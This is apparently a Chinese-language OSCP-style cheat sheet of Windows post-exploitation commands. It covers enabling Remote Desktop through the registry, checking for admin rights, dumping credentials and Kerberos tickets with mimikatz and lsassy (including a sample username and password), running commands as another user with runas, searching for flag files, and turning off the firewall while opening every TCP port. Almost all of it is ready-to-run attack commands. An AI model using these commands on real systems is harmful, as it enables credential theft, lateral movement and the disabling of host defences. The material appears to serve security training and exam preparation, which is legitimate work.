
##### 打开远程桌面 (Administrator 权限)
```powershell
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 
```

##### 确认该用户是否是管理员权限
```powershell
$user = [Security.Principal.WindowsIdentity]::GetCurrent();(New-Object Security.Principal.WindowsPrincipal($user)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

##### 转储凭据信息
- mimikatz.exe
https://github.com/ParrotSec/mimikatz  (有更多转储凭据的命令)
```bash
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit  (需要高权限)
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets" exit
```
- **lsassy** 
https://github.com/login-securite/lsassy
```bash
lsassy -d MS01.oscp.exam -u administrator -p December31 192.168.244.153
```

##### 在 cmd 中以其他用户身份执行 cmd 命令
```powershell
runas /user:dave2 cmd
runas /user:dave2 "powershell -Command Start-Process powershell -Verb RunAs"   (运行dave2的管理员powershell)
```

##### 搜索文件
```powershell
dir C:\ /s /b /A:-D | findstr /i "local.txt"
```

##### 关闭防火墙
```powershell
netsh advfirewall set allprofiles state off
netsh advfirewall firewall add rule name="Open All Ports" dir=in action=allow protocol=TCP localport=0-65535
```